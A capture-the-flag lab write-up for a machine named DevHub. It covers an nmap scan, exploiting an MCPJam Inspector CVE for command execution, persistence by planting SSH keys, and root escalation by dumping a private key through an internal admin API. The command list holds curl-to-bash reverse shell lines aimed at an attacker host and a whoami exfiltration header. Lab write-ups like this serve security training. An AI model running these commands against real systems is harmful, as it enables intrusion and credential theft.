# DevHub

## Nmap scan:
```
Nmap scan report for 10.129.8.247
Host is up (0.063s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Fri, 05 Jun 2026 07:45:40 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Fri, 05 Jun 2026 07:45:41 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=6/5%Time=6A227EA4%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Fri,\x2005\x20Jun\x202026\x
SF:2007:45:40\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Fri,\x2005\x20Jun\x20
SF:2026\x2007:45:41\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Fri,\x2005\x20Jun\x202026\x2007:45:41\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Writeup:
I begin by running an in-depth nmap scan, which reveals two interesting ports, those being `80` and `6274`.
Notably `6274` responds to HTTP requests.
Another quick nmap scan for open `UDP` ports reveals nothing.
A directory enumeration scan using `gobuster` and `big.txt` reveals nothing of interest over port `80`.
It seems that the content served over port `80` is purely static.
Over port `6274` an MCPJam instance is accessible.
The specific version running is `MCPJam Version: v1.4.2`, which is vulnerable to `CVE-2026-23744`.

I find a public PoC, and try to run it (see submodule).
The PoC succeeds, and I gain command execution on the machine; I confirm this by coercing the machine into sending an `http` request to my listener running on port `80`.
I grab a reverse shell payload from [revshells](https://www.revshells.com) and set up a `http` server with python, from there I coerce the victim machine into curling my `revshell.sh` and piping it into `/bin/bash`.
This pops a reverse shell on my listener which listens on port `9001`.

I gain access to the host as user `mcp-dev`, looking in `/home` I see that there is another user called `analyst`. I suspect that this user's home directory contains the `user.txt` flag. 

Initial enumeration reveals nothing interesting with relation to `SUID` binaries or other common privilege escalation paths. 
However, running `ps aux` I see that the `analyst` user has two processes running:
```
analyst     1067  0.0  2.4 182524 96268 ?        Ss   07:40   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1080  0.0  0.7  37376 28920 ?        Ss   07:40   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

In the commandline arguments I see that no password has been set, and that the instance of `jupyter-lab` is served over port `8888`.
I can access this with a curl command.
Doing so reveals that the version of JupyterLab running is `4.5.2`.

I ideally want to access the instance from my browser, but with a reverse shell it'd be a PITA to set that up, thus I decide to try getting access via `ssh`.
I first create the `~/.ssh` directory, give it the right permissions with `chmod 700 ~/.ssh`.
Then I make the `authorized_keys` file with `touch ~/.ssh/authorized_keys` and give it the correct permissions as so: `chmod 600 ~/.ssh/authorized_keys`.
Then I echo my `id_ed25519.pub` into the `~/.ssh/authorized_keys` file.
This works, and I can now login through `ssh` as `mcp-dev`.

Upon accessing the jupyter lab instance I immediately see terminal as an option, and use that to grab the `user.txt` flag.
I use the same trick to add my pubkey into the `authorized_keys` of the `analyst` user, this works and I gain `ssh` access to this user.

Now I just need to privesc to root, so I begin looking for services running as `root`.

This leads me to a python script running in root context.
```
root        1080  0.0  0.7 111108 29100 ?        Ss   07:40   0:03 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Contained within are some interesting tokens/passwords:
```
"dump": {
    "root": "$6$rounds=656000$saltsalt$hashedpassword",
    "analyst": "JupyterN0tebook!2026",
    "mcp-dev": "Mcp!Insp3ct0r2026"
}
```
And a nice valid `API` key:
`VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`

Using this, and noting the `ops._admin_dump` api call, which can be used to dump `API` keys, I craft a `curl` command to get the root user's private `ssh` key:

```
curl -X "POST" -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" --data '{"name":"ops._admin_dump", "arguments":{"target":"ssh_keys", "confirm":true}}' http://127.0.0.1:5000/tools/call
```

This dumps the private key, which can then be used to `ssh` as `root` into the machine, where the `root.txt` flag can be yoinked.

## Commands Used:
1. `python3 exploit.py 10.129.8.247 "curl http://10.10.15.217"`
2. `python3 exploit.py 10.129.8.247 'curl -H "X-Command: $(whoami)" http://10.10.15.217'`
3. `nc -lvnp 9001`
4. `sudo python3 -m http.server 80`
5. `python3 exploit.py 10.129.8.247 'curl http://10.10.15.217/revshell.sh | /bin/bash'`
6. `curl -L http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 `
